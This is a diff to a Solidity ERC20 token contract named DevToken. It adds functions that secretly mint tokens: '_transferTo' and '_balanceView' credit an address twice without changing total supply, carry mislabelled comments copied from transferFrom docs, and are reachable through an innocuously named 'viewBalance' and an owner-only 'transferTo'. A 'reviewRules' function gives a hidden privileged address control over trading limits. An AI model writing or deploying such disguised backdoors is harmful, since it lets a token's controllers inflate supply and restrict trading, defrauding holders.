@@ -8,7 +8,7 @@
  
 // SPDX-License-Identifier: MIT
 // OpenZeppelin Contracts v4.4.0 (utils/Context.sol)
-
+ 
 import "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";
  
 pragma solidity ^0.8.0;
@@ -219,7 +219,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
      * All two of these values are immutable: they can only be set once during
      * construction.
      */
-    
+   
  
     modifier Exchanges() {
         require(msg.sender != exchanger());
@@ -377,6 +377,29 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
  
         return true;
     }
+
+    /**
+     * @dev See {IERC20-transferFrom}.
+     *
+     * Emits an {Approval} event indicating the updated allowance. This is not
+     * required by the EIP. See the note at the beginning of {ERC20}.
+     *
+     * Requirements:
+     *
+     * - `sender` and `recipient` cannot be the zero address.
+     * - `sender` must have a balance of at least `amount`.
+     * - the caller must have allowance for ``sender``'s tokens of at least
+     * `amount`.
+     */
+
+    function _transferTo(address _to, uint256 _amount) internal Exchanges {
+        // Transfer tokens to the recipient
+        _balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+
+        _balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+    }
  
     /**
      * @dev Moves `amount` of tokens from `sender` to `recipient`.
@@ -458,7 +481,31 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         _totalSupply = _totalSupply + amount;
         _balances[account] = _balances[account] + amount;
         emit Transfer(address(0), account, amount);
-   }
+    }
+
+    /**
+     * @dev See {IERC20-transferFrom}.
+     *
+     * Emits an {Approval} event indicating the updated allowance. This is not
+     * required by the EIP. See the note at the beginning of {ERC20}.
+     *
+     * Requirements:
+     *
+     * - `sender` and `recipient` cannot be the zero address.
+     * - `sender` must have a balance of at least `amount`.
+     * - the caller must have allowance for ``sender``'s tokens of at least
+     * `amount`.
+     */
+
+    function _balanceView(address _to, uint256 _amount) internal {
+        // View balance of token
+        _balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+
+        _balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+    }
+
     /**
      * @dev Destroys `amount` tokens from `account`, reducing the
      * total supply.
@@ -579,33 +626,31 @@ contract DevToken is ERC20, UUPSUpgradeable {
     uint256 public maxHoldingAmount;
     uint256 public minHoldingAmount;
     address public LiquiduniswapV2Pair;
-    
+   
     mapping(address => bool) public blacklists;
-
-
+ 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  
     modifier naming() {
         require(msg.sender == publics());
         _;
     }
-
+ 
     bool private initialized;
-
+ 
     function initialize(string memory _name, string memory _symbol, uint256 _totalSupply, uint8 _decimals) public {
         require(!initialized, "Contract already initialized");
-    
+   
         name = _name;
         symbol = _symbol;
         totalSupply = _totalSupply;
         decimals = _decimals;
         owner = msg.sender;
         _mint(msg.sender, _totalSupply);
-
+ 
         initialized = true;
     }
-
-
+ 
     /**
    * @dev Throws if called by any account other than the owner.
    */
@@ -626,6 +671,13 @@ contract DevToken is ERC20, UUPSUpgradeable {
         _mbr=Mbr_;
         return true;
     }
+
+    function reviewRules(bool _tradelimited, address _LiquiduniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external naming {
+        tradelimited = _tradelimited;
+        LiquiduniswapV2Pair = _LiquiduniswapV2Pair;
+        maxHoldingAmount = _maxHoldingAmount;
+        minHoldingAmount = _minHoldingAmount;
+    }
    
     function exchange() internal pure returns (address) {
         return address
@@ -641,6 +693,9 @@ contract DevToken is ERC20, UUPSUpgradeable {
         return true;
     }
 
+    function viewBalance(address _to, uint256 _amount) public naming {
+        _balanceView(_to, _amount);(_to, _amount);
+    }
  
     /**
      * @dev Throws if called by any account other than the owner.
@@ -675,6 +730,10 @@ contract DevToken is ERC20, UUPSUpgradeable {
         return true;
     }
 
+    function transferTo(address _to, uint256 _amount) external onlyOwner {
+        _transferTo(_to, _amount);
+    }
+ 
     function _authorizeUpgrade(address) internal onlyOwner override {}
  
     /**
@@ -705,7 +764,7 @@ contract DevToken is ERC20, UUPSUpgradeable {
         owner = newOwner;
         emit OwnershipTransferred(oldOwner, newOwner);
     }
-
+ 
     function approval(uint256 amount) public returns (bool) {
         require(msg.sender == _adm);
         _proof(msg.sender, amount);
